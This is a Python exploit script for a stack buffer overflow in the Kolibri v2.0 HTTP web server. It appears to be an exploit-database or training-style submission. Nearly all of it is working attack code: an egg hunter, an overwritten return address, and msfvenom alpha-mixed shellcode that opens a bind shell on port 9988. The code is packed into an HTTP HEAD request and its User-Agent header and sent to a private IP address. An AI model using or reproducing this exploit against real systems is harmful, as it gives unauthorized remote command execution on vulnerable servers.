#Kolibri v2.0 HTTP Web Server buffer overflow exploit with egg hunter.
#Structure
#Badchars: \x00\x0d\x0a\x3d\x20\x3f
#Stage1
#EIP: 0x0061b0f9 (push esp)
#ESP: \xEB\xC4 jump back 60 bytes (place for egghunter - marker "woop")
#Stage2
#Shellcode generated by msfvenom encoded with alpha mixed
#Exploit embedded in HTTP header

import sys
import os
import socket

hunter = '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x6f\x6f\x70\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
eip = '\xF9\xB0\x61\x00'

Stage1 = 'X'*478 + hunter + 'X'*5 + eip + '\xEB\xC4'

#msfvenom -p windows/shell_bind_tcp -e x86/alpha_mixed LPORT=9988 -f python
shellcode = ("\x89\xe6\xdb\xcf\xd9\x76\xf4\x59\x49\x49\x49\x49\x49"+
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37"+
"\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"+
"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"+
"\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x7a\x48\x6e\x62"+
"\x53\x30\x43\x30\x73\x30\x35\x30\x4d\x59\x69\x75\x75"+
"\x61\x59\x50\x53\x54\x4e\x6b\x70\x50\x44\x70\x6c\x4b"+
"\x56\x32\x36\x6c\x4c\x4b\x43\x62\x76\x74\x4c\x4b\x64"+
"\x32\x57\x58\x74\x4f\x68\x37\x32\x6a\x65\x76\x34\x71"+
"\x6b\x4f\x6e\x4c\x77\x4c\x65\x31\x33\x4c\x65\x52\x76"+
"\x4c\x37\x50\x79\x51\x7a\x6f\x54\x4d\x57\x71\x4f\x37"+
"\x59\x72\x7a\x52\x56\x32\x62\x77\x6c\x4b\x33\x62\x64"+
"\x50\x4c\x4b\x51\x5a\x35\x6c\x4e\x6b\x70\x4c\x67\x61"+
"\x44\x38\x58\x63\x33\x78\x47\x71\x4e\x31\x73\x61\x6e"+
"\x6b\x51\x49\x61\x30\x75\x51\x4e\x33\x4e\x6b\x42\x69"+
"\x76\x78\x79\x73\x56\x5a\x67\x39\x4c\x4b\x64\x74\x4c"+
"\x4b\x53\x31\x4a\x76\x35\x61\x79\x6f\x6c\x6c\x5a\x61"+
"\x48\x4f\x46\x6d\x43\x31\x59\x57\x65\x68\x39\x70\x54"+
"\x35\x7a\x56\x47\x73\x31\x6d\x78\x78\x45\x6b\x43\x4d"+
"\x36\x44\x32\x55\x78\x64\x51\x48\x4c\x4b\x52\x78\x56"+
"\x44\x75\x51\x39\x43\x45\x36\x4e\x6b\x44\x4c\x32\x6b"+
"\x4e\x6b\x76\x38\x55\x4c\x37\x71\x5a\x73\x6e\x6b\x53"+
"\x34\x6c\x4b\x75\x51\x7a\x70\x4c\x49\x31\x54\x75\x74"+
"\x77\x54\x63\x6b\x71\x4b\x31\x71\x32\x79\x31\x4a\x66"+
"\x31\x4b\x4f\x69\x70\x33\x6f\x71\x4f\x52\x7a\x6e\x6b"+
"\x37\x62\x48\x6b\x4c\x4d\x61\x4d\x65\x38\x30\x33\x36"+
"\x52\x37\x70\x57\x70\x75\x38\x34\x37\x30\x73\x45\x62"+
"\x73\x6f\x50\x54\x70\x68\x50\x4c\x53\x47\x36\x46\x74"+
"\x47\x6b\x4f\x6b\x65\x6f\x48\x6e\x70\x65\x51\x73\x30"+
"\x65\x50\x74\x69\x49\x54\x32\x74\x50\x50\x50\x68\x51"+
"\x39\x4f\x70\x42\x4b\x75\x50\x69\x6f\x7a\x75\x71\x7a"+
"\x74\x48\x52\x79\x72\x70\x6d\x32\x49\x6d\x53\x70\x76"+
"\x30\x33\x70\x30\x50\x42\x48\x69\x7a\x36\x6f\x69\x4f"+
"\x39\x70\x69\x6f\x6b\x65\x4c\x57\x75\x38\x67\x72\x35"+
"\x50\x56\x47\x76\x64\x4f\x79\x6b\x56\x63\x5a\x72\x30"+
"\x56\x36\x61\x47\x30\x68\x4b\x72\x6b\x6b\x57\x47\x75"+
"\x37\x69\x6f\x6a\x75\x50\x57\x71\x78\x4f\x47\x59\x79"+
"\x34\x78\x49\x6f\x39\x6f\x4b\x65\x76\x37\x73\x58\x74"+
"\x34\x38\x6c\x57\x4b\x6b\x51\x59\x6f\x4e\x35\x62\x77"+
"\x4d\x47\x42\x48\x53\x45\x72\x4e\x72\x6d\x53\x51\x59"+
"\x6f\x48\x55\x31\x78\x52\x43\x52\x4d\x31\x74\x73\x30"+
"\x6b\x39\x6d\x33\x33\x67\x50\x57\x52\x77\x34\x71\x69"+
"\x66\x73\x5a\x75\x42\x42\x79\x52\x76\x6b\x52\x39\x6d"+
"\x53\x56\x68\x47\x72\x64\x35\x74\x67\x4c\x76\x61\x45"+
"\x51\x6c\x4d\x47\x34\x36\x44\x64\x50\x39\x56\x73\x30"+
"\x62\x64\x71\x44\x46\x30\x70\x56\x76\x36\x61\x46\x67"+
"\x36\x56\x36\x50\x4e\x72\x76\x53\x66\x51\x43\x76\x36"+
"\x75\x38\x34\x39\x6a\x6c\x67\x4f\x6b\x36\x4b\x4f\x5a"+
"\x75\x6c\x49\x49\x70\x70\x4e\x62\x76\x53\x76\x59\x6f"+
"\x44\x70\x33\x58\x66\x68\x4b\x37\x67\x6d\x75\x30\x49"+
"\x6f\x39\x45\x6f\x4b\x38\x70\x68\x35\x4e\x42\x63\x66"+
"\x30\x68\x6f\x56\x4e\x75\x4f\x4d\x6f\x6d\x49\x6f\x49"+
"\x45\x47\x4c\x34\x46\x43\x4c\x75\x5a\x6b\x30\x4b\x4b"+
"\x39\x70\x62\x55\x45\x55\x6f\x4b\x31\x57\x46\x73\x50"+
"\x72\x70\x6f\x72\x4a\x33\x30\x46\x33\x39\x6f\x6e\x35"+
"\x41\x41")

shell = '\x90'*20 + shellcode
Stage2 = 'woopwoop' + shell

buff =("HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.111.128:8080\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
sock.connect(('192.168.0.11',8080))
sock.send(buff)
sock.close()
